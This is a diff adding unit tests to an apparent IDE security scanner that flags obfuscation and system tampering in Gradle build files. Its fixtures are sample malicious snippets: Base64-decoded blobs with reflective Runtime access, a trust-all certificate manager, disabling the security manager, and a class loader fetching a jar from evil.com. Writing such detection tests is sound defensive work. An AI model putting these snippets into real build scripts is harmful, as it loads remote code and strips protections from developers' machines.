@@ -53,4 +53,38 @@ class SecurityScannerTest : BasePlatformTestCase() {
         assertEquals(RiskLevel.HIGH, violations[0].riskLevel)
         assertTrue(violations[0].message.contains("user.home"))
     }
+
+    fun `test obfuscation detection`() {
+        val check = ObfuscationCheck()
+        val maliciousCode = """
+            val encoded = "TVoAAAQEAAAA////"
+            val decoder = java.util.Base64.getDecoder()
+            val decoded = decoder.decode(encoded)
+            val method = Class.forName("java.lang.Runtime").getDeclaredMethod("getRuntime")
+        """.trimIndent()
+
+        val file = myFixture.configureByText("build.gradle.kts", maliciousCode)
+        val violations = check.check(file.virtualFile, maliciousCode)
+
+        assertNotEmpty(violations)
+        assertTrue(violations.any { it.message.contains("java.util.Base64") })
+        assertTrue(violations.any { it.message.contains("getDeclaredMethod") })
+    }
+
+    fun `test system tampering detection`() {
+        val check = SystemTamperingCheck()
+        val maliciousCode = """
+            val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager { ... })
+            System.setSecurityManager(null)
+            val cl = URLClassLoader(arrayOf(URL("http://evil.com/payload.jar")))
+        """.trimIndent()
+
+        val file = myFixture.configureByText("build.gradle", maliciousCode)
+        val violations = check.check(file.virtualFile, maliciousCode)
+
+        assertNotEmpty(violations)
+        assertTrue(violations.any { it.message.contains("TrustManager") })
+        assertTrue(violations.any { it.message.contains("setSecurityManager") })
+        assertTrue(violations.any { it.message.contains("URLClassLoader") })
+    }
 }
